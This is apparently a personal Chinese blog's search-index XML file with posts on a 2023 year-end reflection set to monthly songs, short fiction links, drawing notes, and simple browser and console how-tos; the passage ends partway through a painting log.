<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023-年终总结</title>
    <url>/posts/2023.html</url>
    <content><![CDATA[<h1 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h1><ul>
<li><strong>一月是一阳来复的1月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i1">
        <img width="100%" src="/music/images/bandbox.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p1">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c1">
      <div id="music-info">
        <h2>半岛铁盒</h2>
        <p>周杰伦</p>
      </div>
      <audio id="player1" class="aud" controls="" loop="">
        <source src="/music/songs/bandbox.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>恁是一阳来复后，梅花柳眼先春发</p>
<p>提前的遣返，疫情的尾声，三年的战役，特别的新年。</p>
<p>阳的开始，是青春记忆的结束。</p>
<p>命运的齿轮开始转动……</p>
<p>在家的温床上，在学的网课中，在心的交流下，</p>
<p>与她——相遇，相识，相熟。</p>
</li>
</ul>
<h1 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h1><ul>
<li><strong>二月是焦虑迷茫的2月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i2">
        <img width="100%" src="/music/images/trigger.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p2">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c2">
      <div id="music-info">
        <h2>明日見る者たち</h2>
        <p>寺坂赖我/豊田ルナ/金子隼也</p>
      </div>
      <audio id="player2" class="aud" controls="" loop="">
        <source src="/music/songs/trigger.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>期末的临近，无形的压力，怠惰的意志，自责的心理。</p>
<p>空有天马行空，败于止步想象。</p>
<p>一遍遍的提心吊胆，一直抵达开学前夕。</p>
<p>“但是开学了就能见到她了。”</p>
<p>纵是深情心中负，难掩愁思口中抿。</p>
<p>自此心中埋下了种子……</p>
</li>
</ul>
<h1 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h1><ul>
<li><strong>三月是梦幻美好的3月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i3">
        <img width="100%" src="/music/images/stopwatch.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p3">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c3">
      <div id="music-info">
        <h2>对表</h2>
        <p>陈雪燃</p>
      </div>
      <audio id="player3" class="aud" controls="" loop="">
        <source src="/music/songs/stopwatch.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>这是我过过的最印象深刻的一个生日</p>
<div style="display: flex;">
  <div style="flex: 810;">
    <img src="/img/jiguo-birthday.jpg" alt="">
  </div>
  <div style="flex: 100;"></div>
  <div style="flex: 4717;">
    <img src="/img/gift.jpg" alt="">
  </div>
</div>

<p>那不只是朋友们的祝福与礼物，更是我逝去的那一个个友情。</p>
<p>那不是一个普通的蛋糕，而是我心上人的心意，微妙的感觉与氛围，是我永远不会忘却的回忆。</p>
<p>月底，在暗示下，结束了长期的拉锯战，终于，我和她，开始书写我们的第一次。</p>
</li>
</ul>
<h1 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h1><ul>
<li><strong>四月是恍若隔世的4月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i4">
        <img width="100%" src="/music/images/pugongying.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p4">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c4">
      <div id="music-info">
        <h2>蒲公英的约定</h2>
        <p>周杰伦</p>
      </div>
      <audio id="player4" class="aud" controls="" loop="">
        <source src="/music/songs/pugongying.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>一起长大的约定，那样清晰。</p>
<p>无知的少年，因为自己的幼稚失去了一个很爱很爱的女孩……</p>
<p>而我已经分不清，你是友情，还是错过的爱情……</p>
</li>
</ul>
<h1 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h1><ul>
<li><strong>五月是一蹶不振的5月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i5">
        <img width="100%" src="/music/images/yourname.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p5">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c5">
      <div id="music-info">
        <h2>なんでもないや</h2>
        <p>RADWIMPS (ラッドウィンプス)</p>
      </div>
      <audio id="player5" class="aud" controls="" loop="">
        <source src="/music/songs/yourname.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>他，不能买醉，</p>
<p>因为不会喝酒，</p>
<p>但也已经接近了……</p>
<p>思念战胜了克制，冲动击溃了理智。</p>
<p>人生若只如初见，何事秋风悲画扇。</p>
<p>一个湖，一个人，一个晚上，</p>
<p>他含着泪，告别了他最心爱的女孩……</p>
</li>
</ul>
<h1 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h1><ul>
<li><strong>六月是漂泊流浪的6月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i6">
        <img width="100%" src="/music/images/remember.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p6">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c6">
      <div id="music-info">
        <h2>我记得</h2>
        <p>赵雷</p>
      </div>
      <audio id="player6" class="aud" controls="" loop="">
        <source src="/music/songs/remember.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>新地如重游，一睹若千年。</p>
<p>孤身西进，只为探寻过去躺在想象中的西海；</p>
<p>踽踽独行，人生不过反复找寻那曾经的自己。</p>
<p>几时恨，期末抢救火葬场；</p>
<p>无人会，自食其果唐中唐。</p>
</li>
</ul>
<h1 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h1><ul>
<li><strong>七月是忙忙碌碌的7月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i7">
        <img width="100%" src="/music/images/yuanyuchou.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p7">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c7">
      <div id="music-info">
        <h2>愿与愁</h2>
        <p>林俊杰</p>
      </div>
      <audio id="player7" class="aud" controls="" loop="">
        <source src="/music/songs/yuanyuchou.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>忙忙碌碌，反反复复，那是我的言不由衷</p>
<p>忘不掉，不可能忘得掉。</p>
<p>他选择用密密麻麻的事填满自己，麻痹自己。</p>
</li>
</ul>
<h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><ul>
<li><strong>八月是开拓西途的8月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i8">
        <img width="100%" src="/music/images/qimeidi.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p8">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c8">
      <div id="music-info">
        <h2>凄美地</h2>
        <p>郭顶</p>
      </div>
      <audio id="player8" class="aud" controls="" loop="">
        <source src="/music/songs/qimeidi.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>故事开篇，是……</p>
<p>新的故事？</p>
</li>
</ul>
<h1 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h1><ul>
<li><strong>九月是误入迷途的9月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i9">
        <img width="100%" src="/music/images/only.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p9">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c9">
      <div id="music-info">
        <h2>唯一</h2>
        <p>告五人</p>
      </div>
      <audio id="player9" class="aud" controls="" loop="">
        <source src="/music/songs/only.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>迷茫的游子，不安的河水，</p>
<p>实迷途其未远，觉今是而昨非？</p>
<p>春天的季节？</p>
<p>奔赴虚妄的聚会，由I变E；</p>
<p>作茧自缚的怪圈，误入迷途。</p>
</li>
</ul>
<h1 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h1><ul>
<li><strong>十月是坠入现实的10月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i10">
        <img width="100%" src="/music/images/xuanni.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p10">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c10">
      <div id="music-info">
        <h2>悬溺</h2>
        <p>葛东琪</p>
      </div>
      <audio id="player10" class="aud" controls="" loop="">
        <source src="/music/songs/xuanni.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>悬溺一响，纯爱登场。</p>
<p>你……</p>
<p>是纯爱吗？</p>
<p>原来，我早就迷失了初心。</p>
</li>
</ul>
<h1 id="十一月"><a href="#十一月" class="headerlink" title="十一月"></a>十一月</h1><ul>
<li><strong>十一月是朦胧幻梦的11月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i11">
        <img width="100%" src="/music/images/maple.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p11">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c11">
      <div id="music-info">
        <h2>枫</h2>
        <p>周杰伦</p>
      </div>
      <audio id="player11" class="aud" controls="" loop="">
        <source src="/music/songs/maple.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>是真的，还是假的？</p>
<p>既然如此，便顺其自然吧。</p>
</li>
</ul>
<h1 id="十二月"><a href="#十二月" class="headerlink" title="十二月"></a>十二月</h1><ul>
<li><strong>十二月是碌碌无为的12月</strong></li>
</ul>
<div id="music-player">
  <div class="music-player_main">
    <!-- 唱片 -->
    <div class="music-player_disc">
      <!-- 唱片图片 -->
      <div class="music-player_image i12">
        <img width="100%" src="/music/images/Christmas.jpg" alt="">
      </div>
      <!-- 指针 -->
      <div class="music-player_pointer p12">
        <img width="100%" src="/img/cd_tou.png" alt="">
      </div>
    </div>
    <div class="music-player_controls c12">
      <div id="music-info">
        <h2>圣诞结</h2>
        <p>陈奕迅</p>
      </div>
      <audio id="player12" class="aud" controls="" loop="">
        <source src="/music/songs/Christmas.mp3" type="audio/mp3">
      </audio>
    </div>
  </div>
</div>

<ul>
<li><p>“我爱过的人，没有一个留在身边。寂寞它陪我过夜。”</p>
<p>到最后回头才发现，自己什么也没带来，什么也没带走。</p>
<p>一切，如新。</p>
</li>
</ul>
<blockquote>
<p>过了一年，也真正成长了一年。</p>
<p>这一年，我看见了爱情，看见了友情，看见了亲情。</p>
<p>到头来，</p>
<p>看见了：自己。</p>
<p>这会是最特别的2023，多年后的我回看自己，应该能把它当作一段有趣的故事吧……</p>
<p>“欲买桂花同载酒，终不似，少年游。”</p>
</blockquote>
]]></content>
      <categories>
        <category>生活记录</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
        <tag>年度报告</tag>
        <tag>2023</tag>
      </tags>
  </entry>
  <entry>
    <title>小朋友的脑回路……</title>
    <url>/posts/qingbei.html</url>
    <content><![CDATA[<blockquote>
<p>祝长命百岁！</p>
</blockquote>
<p><img src="/img/qb.jpg" alt="为什么不考清北"></p>
<div style="display: flex;">
  <div style="flex: 1;"></div>
  <div style="flex: 2;">
    <img src="/img/sb.jpg" alt="因为我是傻逼">
  </div>
  <div style="flex: 1;"></div>
</div>
]]></content>
      <categories>
        <category>动态感悟</category>
      </categories>
      <tags>
        <tag>小朋友</tag>
        <tag>脑回路</tag>
        <tag>清华</tag>
        <tag>北大</tag>
        <tag>傻逼</tag>
      </tags>
  </entry>
  <entry>
    <title>名侦探柯南OP/ED全集统计</title>
    <url>/posts/conan_op_ed.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>系列统计</category>
      </categories>
      <tags>
        <tag>名侦探柯南</tag>
        <tag>OP</tag>
        <tag>ED</tag>
        <tag>音乐</tag>
        <tag>系列</tag>
      </tags>
  </entry>
  <entry>
    <title>LFWY（四个小说）</title>
    <url>/posts/LFWY.html</url>
    <content><![CDATA[<blockquote>
<p>“而我已经分不清，你是友情，还是错过的爱情。”——《蒲公英的约定》</p>
<p>多年后再次见到你，那个曾经那么喜欢的女孩，心跳的一瞬间，你还能分清这是一种友情，还是因为缘分而错过的爱情吗？</p>
</blockquote>
<h2 id="L"><a href="#L" class="headerlink" title="L"></a>L</h2><a href="/L/"  title="L" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/LFWY/L.jpg" class="no-lightbox"></div><div class="link_content"><div class="link_title">L</div><div class="link_desc">我知道那些夏天 就像青春一样回不来</div></div></a>
<h2 id="F"><a href="#F" class="headerlink" title="F"></a>F</h2><a href="/F/"  title="F" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/LFWY/F.jpg" class="no-lightbox"></div><div class="link_content"><div class="link_title">F</div><div class="link_desc">而我已经分不清 你是友情还是错过的爱情</div></div></a>
<h2 id="W"><a href="#W" class="headerlink" title="W"></a>W</h2><a href="/W/"  title="W" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/LFWY/W.jpg" class="no-lightbox"></div><div class="link_content"><div class="link_title">W</div><div class="link_desc">你不想证明 证明我是你唯一</div></div></a>
<h2 id="Y"><a href="#Y" class="headerlink" title="Y"></a>Y</h2><a href="/Y/"  title="Y" referrerPolicy="no-referrer" class="link_card"><div class="link_icon"><img src="/img/LFWY/Y.jpg" class="no-lightbox"></div><div class="link_content"><div class="link_title">Y</div><div class="link_desc">我要的只是你在我身边</div></div></a>
]]></content>
      <categories>
        <category>文学创作</category>
      </categories>
      <tags>
        <tag>小说</tag>
        <tag>写作</tag>
        <tag>LFWY</tag>
        <tag>心理</tag>
        <tag>爱情</tag>
        <tag>友情</tag>
        <tag>朋友</tag>
      </tags>
  </entry>
  <entry>
    <title>批改网英语作文无法“粘贴”的解决办法</title>
    <url>/posts/pigai.html</url>
    <content><![CDATA[<center>当你想粘贴作文时……</center>

<p><img src="/img/pigai/pigai.png" alt="pigai"></p>
<h2 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h2><h3 id="（以Edge浏览器为例）"><a href="#（以Edge浏览器为例）" class="headerlink" title="（以Edge浏览器为例）"></a>（以Edge浏览器为例）</h3><h3 id="打开批改网↓"><a href="#打开批改网↓" class="headerlink" title="打开批改网↓"></a>打开批改网↓</h3><p><img src="/img/pigai/01.png" alt="1"></p>
<h3 id="然后下面两种方法二选一↓"><a href="#然后下面两种方法二选一↓" class="headerlink" title="然后下面两种方法二选一↓"></a>然后下面两种方法二选一↓</h3><div style="display: flex;">
  <div style="flex: 1920; text-align: center;">
    <p>1.直接点击F12（有的电脑需要先点击Fn）</p>
    <img src="/img/pigai/02.png" alt="1">
  </div>
  <div style="flex: 100"></div>
  <div style="flex: 985; text-align: center;">
    <p>2.从浏览器右上角进入</p>
    <img src="/img/pigai/03.png" alt="2">
  </div>
</div>

<h3 id="呼出侧边栏之后，点击左上角的图标↓"><a href="#呼出侧边栏之后，点击左上角的图标↓" class="headerlink" title="呼出侧边栏之后，点击左上角的图标↓"></a>呼出侧边栏之后，点击左上角的图标↓</h3><div style="display: flex;">
  <div style="flex: 1440; text-align: center;">
    <img src="/img/pigai/04.png" alt="1">
  </div>
  <div style="flex: 100"></div>
  <div style="flex: 1021; text-align: center;">
    <img src="/img/pigai/05.jpg" alt="2">
  </div>
</div>

<div style="display: flex;">
  <div style="flex: 1440; text-align: center;">
    <img src="/img/pigai/06.png" alt="灰">
    <p>从灰色</p>
  </div>
  <div style="flex: 100"></div>
  <div style="flex: 1021; text-align: center;">
    <img src="/img/pigai/07.png" alt="蓝">
    <p>变成蓝色</p>
  </div>
</div>

<h3 id="然后把鼠标移到写作文的框框里↓"><a href="#然后把鼠标移到写作文的框框里↓" class="headerlink" title="然后把鼠标移到写作文的框框里↓"></a>然后把鼠标移到写作文的框框里↓</h3><p><img src="/img/pigai/08.png" alt="8"></p>
<h3 id="在框内点击后，侧边将跳到如图的位置↓"><a href="#在框内点击后，侧边将跳到如图的位置↓" class="headerlink" title="在框内点击后，侧边将跳到如图的位置↓"></a>在框内点击后，侧边将跳到如图的位置↓</h3><p><img src="/img/pigai/09.png" alt="9"></p>
<div style="display: flex;">
  <div style="flex: 10; text-align: center;">
    <p>右键这里↓</p>
    <img src="/img/pigai/10.png" alt="1">
  </div>
  <div style="flex: 1"></div>
  <div style="flex: 10; text-align: center;">
    <p>然后点这↓</p>
    <img src="/img/pigai/11.png" alt="2">
  </div>
</div>

<h3 id="然后点击这里（将光标移动到这）↓"><a href="#然后点击这里（将光标移动到这）↓" class="headerlink" title="然后点击这里（将光标移动到这）↓"></a>然后点击这里（将光标移动到这）↓</h3><p><img src="/img/pigai/12.png" alt="12"></p>
<h3 id="按下Ctrl-V将作文粘贴进来↓"><a href="#按下Ctrl-V将作文粘贴进来↓" class="headerlink" title="按下Ctrl+V将作文粘贴进来↓"></a>按下Ctrl+V将作文粘贴进来↓</h3><p><img src="/img/pigai/13.png" alt="13"></p>
<h3 id="点击左边的空白区域↓"><a href="#点击左边的空白区域↓" class="headerlink" title="点击左边的空白区域↓"></a>点击左边的空白区域↓</h3><p><img src="/img/pigai/14.png" alt="14"></p>
<h3 id="然后你就会发现，左边的作文框已经填好了你粘贴的作文啦！↓"><a href="#然后你就会发现，左边的作文框已经填好了你粘贴的作文啦！↓" class="headerlink" title="然后你就会发现，左边的作文框已经填好了你粘贴的作文啦！↓"></a>然后你就会发现，左边的作文框已经填好了你粘贴的作文啦！↓</h3><p><img src="/img/pigai/15.png" alt="15"></p>
<h2 id="完成！"><a href="#完成！" class="headerlink" title="完成！"></a><center>完成！</center></h2><p><img src="/img/pigai/16.png" alt="16"></p>
]]></content>
      <categories>
        <category>分享技巧</category>
      </categories>
      <tags>
        <tag>作业</tag>
        <tag>批改网</tag>
        <tag>英语作文</tag>
        <tag>F12开发人员工具</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>控制台调成黑体（字体）步骤</title>
    <url>/posts/Gothic.html</url>
    <content><![CDATA[<h3 id="第一步：按下Win-R"><a href="#第一步：按下Win-R" class="headerlink" title="第一步：按下Win+R"></a>第一步：按下Win+R</h3><p><img src="/img/Gothic/win+r.png" alt="快捷键"></p>
<h3 id="第二步：输入cmd然后点‘确定’"><a href="#第二步：输入cmd然后点‘确定’" class="headerlink" title="第二步：输入cmd然后点‘确定’"></a>第二步：输入cmd然后点‘确定’</h3><p><img src="/img/Gothic/cmd.png" alt="cmd"></p>
<h3 id="第三步：点击下拉菜单"><a href="#第三步：点击下拉菜单" class="headerlink" title="第三步：点击下拉菜单"></a>第三步：点击下拉菜单</h3><p><img src="/img/Gothic/jiantou.png" alt="箭头"></p>
<h3 id="第四步：点击设置"><a href="#第四步：点击设置" class="headerlink" title="第四步：点击设置"></a>第四步：点击设置</h3><p><img src="/img/Gothic/xiala.png" alt="下拉菜单"></p>
<h3 id="第五步：点击默认值"><a href="#第五步：点击默认值" class="headerlink" title="第五步：点击默认值"></a>第五步：点击默认值</h3><p><img src="/img/Gothic/shezhi.png" alt="设置"></p>
<h3 id="第六步：点击外观"><a href="#第六步：点击外观" class="headerlink" title="第六步：点击外观"></a>第六步：点击外观</h3><p><img src="/img/Gothic/default.png" alt="默认值"></p>
<h3 id="第七步：把字体改成黑体即可"><a href="#第七步：把字体改成黑体即可" class="headerlink" title="第七步：把字体改成黑体即可"></a>第七步：把字体改成黑体即可</h3><p><img src="/img/Gothic/waiguan.png" alt="外观"></p>
<h3 id="第八步：保存之后就可以关闭了"><a href="#第八步：保存之后就可以关闭了" class="headerlink" title="第八步：保存之后就可以关闭了"></a>第八步：保存之后就可以关闭了</h3><p><img src="/img/Gothic/save.png" alt="保存"></p>
]]></content>
      <categories>
        <category>技术学习</category>
      </categories>
      <tags>
        <tag>控制台</tag>
        <tag>黑体</tag>
        <tag>字体</tag>
      </tags>
  </entry>
  <entry>
    <title>新头像绘制细节与思路</title>
    <url>/posts/avatar.html</url>
    <content><![CDATA[<h2 id="原头像↓"><a href="#原头像↓" class="headerlink" title="原头像↓"></a><center>原头像↓</center></h2><center>网图（原作者不详）</center>

<p><img src="/img/NewAvatar/avatar.jpg" alt="old"></p>
<h2 id="新头像↓"><a href="#新头像↓" class="headerlink" title="新头像↓"></a><center>新头像↓</center></h2><center>半临摹（仅自用，不商用）</center>

<p><img src="/img/NewAvatar/avatar.png" alt="new"></p>
<h2 id="绘制展示"><a href="#绘制展示" class="headerlink" title="绘制展示"></a>绘制展示</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><strong><center>Adobe Photoshop 2020</center></strong></p>
<p><img src="/img/NewAvatar/01.png" alt="01"></p>
<h3 id="图层总览"><a href="#图层总览" class="headerlink" title="图层总览"></a>图层总览</h3><p><img src="/img/NewAvatar/02.png" alt="02"></p>
<h2 id="细节与思路"><a href="#细节与思路" class="headerlink" title="细节与思路"></a>细节与思路</h2><p>我最先绘制的就是柠檬部分（画了一下午），</p>
<p>参考的是发行于2018-03-14的专辑<a href="https://y.qq.com/n/ryqq/albumDetail/002OR8wD3Lo3E5">《レモン》</a>的封面（左图），</p>
<p>与原来网图的加工不同，这次我追求的是“原汁原味”，临摹的只是轮廓，上色是自己用简陋的ps技术潦草上的（毕竟第一次用ps画画……），只能说没有彻底还原了，稍微有点可惜。</p>
<div style="display: flex;">
  <div style="flex: 1; text-align: center;">
    <img src="/img/NewAvatar/03.jpg" alt="专辑封面">
    <p>专辑封面</p>
  </div>
  <div style="flex: 1; text-align: center;">
    <img src="/img/NewAvatar/04.png" alt="临摹效果">
    <p>临摹效果</p>
  </div>
</div>

<p>头部总体还是没啥大区别，但是就<strong>眼镜</strong>和<strong>眼睛</strong>进行了修改。</p>
<p><img src="/img/NewAvatar/05.png" alt="05"></p>
<p>原先是没有眼镜的，于是我照着我自己的眼镜给他画上了；（左）</p>
<p>至于眼睛，改成了“<strong>火</strong>”字，至于为什么加上了个❤，我也不知道，可能我就是习惯在写完名字后加个❤吧……（右）</p>
<div style="display: flex;">
  <div style="flex: 657; text-align: center;">
    <img src="/img/NewAvatar/06.png" alt="眼镜">
    <p>眼镜</p>
  </div>
  <div style="flex: 332; text-align: center;">
    <img src="/img/NewAvatar/07.png" alt="眼睛">
    <p>眼睛</p>
  </div>
</div>

<p>衣服就是大改了，直接上图，里面一件长袖，外面一件我自己最爱穿的外套。</p>
<div style="display: flex;">
  <div style="flex: 1; text-align: center;">
    <img src="/img/NewAvatar/08.png" alt="长袖">
    <p>长袖</p>
  </div>
  <div style="flex: 1; text-align: center;">
    <img src="/img/NewAvatar/09.png" alt="外套">
    <p>外套</p>
  </div>
</div>

<p>双手位置也略有改动</p>
<div style="display: flex;">
  <div style="flex: 1; text-align: center;">
    <img src="/img/NewAvatar/avatar.jpg" alt="原">
    <p>原</p>
  </div>
  <div style="flex: 1; text-align: center;">
    <img src="/img/NewAvatar/09.png" alt="新">
    <p>新</p>
  </div>
</div>

<p>最后发现，白外套在白背景下…有点看不太清楚，于是换了个背景色，就完成了现在这样</p>
<p><img src="/img/NewAvatar/avatar.png" alt="avatar"></p>
<p><a href="/file/新头像.psd">源文件下载.psd</a></p>
<p>（仅供技术交流与分享，严禁用于其他用途）</p>
]]></content>
      <categories>
        <category>生活记录</category>
      </categories>
      <tags>
        <tag>画画</tag>
        <tag>Ps</tag>
        <tag>头像</tag>
        <tag>板绘</tag>
      </tags>
  </entry>
  <entry>
    <title>百画计划</title>
    <url>/posts/100.html</url>
    <content><![CDATA[<blockquote>
<p>立志这辈子画 100 幅画 （ <strong>18</strong> / 100 ）</p>
</blockquote>
<h2 id="2020-07-06"><a href="#2020-07-06" class="headerlink" title="2020-07-06"></a>2020-07-06</h2><h3 id="皮卡丘"><a href="#皮卡丘" class="headerlink" title="皮卡丘"></a>皮卡丘</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/001.jpg" alt="皮卡丘">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2020-07-07"><a href="#2020-07-07" class="headerlink" title="2020-07-07"></a>2020-07-07</h2><h3 id="高考加油"><a href="#高考加油" class="headerlink" title="高考加油"></a>高考加油</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/002.jpg" alt="高考加油">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2020-08-02"><a href="#2020-08-02" class="headerlink" title="2020-08-02"></a>2020-08-02</h2><h3 id="鬼灭之刃"><a href="#鬼灭之刃" class="headerlink" title="鬼灭之刃"></a>鬼灭之刃</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/003.jpg" alt="鬼灭之刃">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2020-08-21"><a href="#2020-08-21" class="headerlink" title="2020-08-21"></a>2020-08-21</h2><h3 id="童年男神"><a href="#童年男神" class="headerlink" title="童年男神"></a>童年男神</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/004.jpg" alt="童年男神">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2021-02-04"><a href="#2021-02-04" class="headerlink" title="2021-02-04"></a>2021-02-04</h2><h3 id="起风了"><a href="#起风了" class="headerlink" title="起风了"></a>起风了</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/005.jpg" alt="起风了">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2021-02-12"><a href="#2021-02-12" class="headerlink" title="2021-02-12"></a>2021-02-12</h2><h3 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/006.jpg" alt="新年快乐">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2021-05-15"><a href="#2021-05-15" class="headerlink" title="2021-05-15"></a>2021-05-15</h2><h3 id="乔巴"><a href="#乔巴" class="headerlink" title="乔巴"></a>乔巴</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/007.jpg" alt="乔巴">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2021-07-29"><a href="#2021-07-29" class="headerlink" title="2021-07-29"></a>2021-07-29</h2><h3 id="蓝莲花"><a href="#蓝莲花" class="headerlink" title="蓝莲花"></a>蓝莲花</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/008.jpg" alt="蓝莲花">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2021-07-30"><a href="#2021-07-30" class="headerlink" title="2021-07-30"></a>2021-07-30</h2><h3 id="太宰治"><a href="#太宰治" class="headerlink" title="太宰治"></a>太宰治</h3><div style="display: flex;">
  <div style="flex: 100"></div>
  <div style="flex: 987">
    <img src="/img/painting/009-1.jpg" alt="太宰治">
  </div>
  <div style="flex: 100"></div>
  <div style="flex: 1156">
    <img src="/img/painting/009-2.jpg" alt="太宰治">
  </div>
  <div style="flex: 100"></div>
</div>

<h2 id="2022-04-05"><a href="#2022-04-05" class="headerlink" title="2022-04-05"></a>2022-04-05</h2><h3 id="T2噬菌体"><a href="#T2噬菌体" class="headerlink" title="T2噬菌体"></a>T2噬菌体</h3><div style="display: flex;">
  <div style="flex: 1"></div>
  <div style="flex: 5">
    <img src="/img/painting/010.jpg" alt="T2噬菌体">
  </div>
  <div style="flex: 1"></div>
</div>

<h2 id="2022-06-26"><a href="#2022-06-26" class="headerlink" title="2022-06-26"></a>2022-06-26</h2><h3 id="六位天使"><a href="#六位天使" class="headerlink" title="六位天使"></a>六位天使</h3><div style="display: flex;">
  <div style="flex: 9; text-align: center;">
    <p>1.可盐可甜</p>
    <img src="/img/painting/011-1.jpg" alt="LQP">
  </div>
